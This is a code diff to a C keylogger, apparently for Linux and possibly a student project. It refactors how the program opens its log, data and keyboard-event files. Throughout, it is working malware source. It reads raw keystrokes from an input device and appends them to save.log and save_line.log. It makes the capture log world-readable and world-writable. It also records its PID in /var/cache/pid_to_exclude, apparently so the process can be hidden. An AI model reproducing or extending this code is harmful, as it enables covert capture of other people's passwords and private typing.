@@ -10,6 +10,9 @@ void	clean_quit(t_keylogger *klg, int code)
 {
 	close(klg->keyboardFD);
 	close(klg->saveFD);
+	close(klg->saveLineFD);
+	close(klg->logFD);
+	close(klg->dataFD);
 	exit(code);
 }
 
@@ -19,11 +22,12 @@ void	save_pid(t_keylogger *klg)
 	int		fd;
 
 	pid = getpid();
-	if (((fd = open("pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC)) > -1)
+	if (((fd = open("/var/cache/pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC, 0666)) > -1)
 		&& (write(fd, &pid, sizeof(pid)) > -1))
 		dprintf(klg->logFD, "write pid with success: %d\n", pid);
 	else
 		dprintf(klg->logFD , "ERROR writing pid: %d\n", pid);
+	close(fd);
 }
 
 void	selectKey(t_keylogger *klg)
@@ -52,13 +56,45 @@ void	recording(t_keylogger *klg)
 }
 int		parseData(t_keylogger *klg)
 {
+	dprintf(klg->logFD, "Parse klg.data\n");
 	if (get_next_line(klg->dataFD, &klg->event_location) == ERROR)
 		return -1;
 	if (get_next_line(klg->dataFD, &klg->rawMap) == ERROR)
 		return -1;
 	return 0;
 }
-
+int		openFiles(t_keylogger *klg)
+{
+	if((klg->logFD = open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0666)) <= 0)
+		return -1;
+	if((klg->dataFD = open(DATAPATH, O_RDONLY)) <= 0)
+	{
+		dprintf(klg->logFD, "Fail to open file:\tklg.data\n");
+		return -1;
+	}
+	parseData(klg);
+	dprintf(klg->logFD, "open klg.data file with success\n");
+	if((klg->keyboardFD = open(klg->event_location, O_RDONLY)) <= 0)
+	{
+		dprintf(klg->logFD, "Fail to open file:\teventX-%s\n", klg->event_location);
+		close(klg->logFD);
+		return -1;
+	}
+	dprintf(klg->logFD, "open eventX file with success\n");
+	if((klg->saveFD = open(LOGPATH "save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
+	{
+		dprintf(klg->logFD, "open %ssave.log file failed\n", LOGPATH);
+		return -1;
+	}
+	dprintf(klg->logFD, "open file save.log with success\n");
+	if((klg->saveLineFD = open(LOGPATH "save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
+	{
+		dprintf(klg->logFD, "open %ssave_line.log file failed\n", LOGPATH);
+		return -1;
+	}
+	dprintf(klg->logFD, "open file %ssave_line.log with success\n", LOGPATH);
+	return 0;
+}
 void	keylogger(void)
 {
 	t_keylogger         *klg;
@@ -67,30 +103,12 @@ void	keylogger(void)
 	klg = getKlg();
 	signal_handle(klg);
 	save_pid(klg);
-	if((klg->logFD = open(LOGPATH, O_RDWR | O_CREAT, 0666)) <= 0)
+	if (openFiles(klg) == -1)
 		return ;
-	if((klg->dataFD = open(DATAPATH, O_RDONLY)) <= 0)
-		return ;
-	parseData(klg);
-	if((klg->keyboardFD = open(klg->event_location, O_RDONLY)) <= 0)
-	{
-		dprintf(klg->logFD, "open file failed\n");
-		return ;
-	}
-	if((klg->saveFD = open("/home/user42/Bureau/keylogger/logs/save.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
-	{
-		dprintf(klg->logFD, "open save.log file failed\n");
-		return ;
-	}
-	if((klg->saveLineFD = open("/home/user42/Bureau/keylogger/logs/save_line.log", O_RDWR | O_CREAT | O_APPEND, 0666)) <= 0)
-	{
-		dprintf(klg->logFD, "open save_line.log file failed\n");
-		return ;
-	}
-	chmod("save.log", S_IROTH | S_IWOTH);
-	if (setKeyMap(klg, klg->rawMap) == ERROR) //TODO enlever un parametre
+	chmod(LOGPATH "save.log", S_IROTH | S_IWOTH);
+	if (setKeyMap(klg) == ERROR)
 		clean_quit(klg, ERROR);
-	dprintf(klg->logFD, "Start recording\n");
+	dprintf(klg->logFD, "--Start recording\n");
 	recording(klg);
 	dprintf(klg->logFD, "Stop recording\n");
 	clean_quit(klg, SUCCESS);
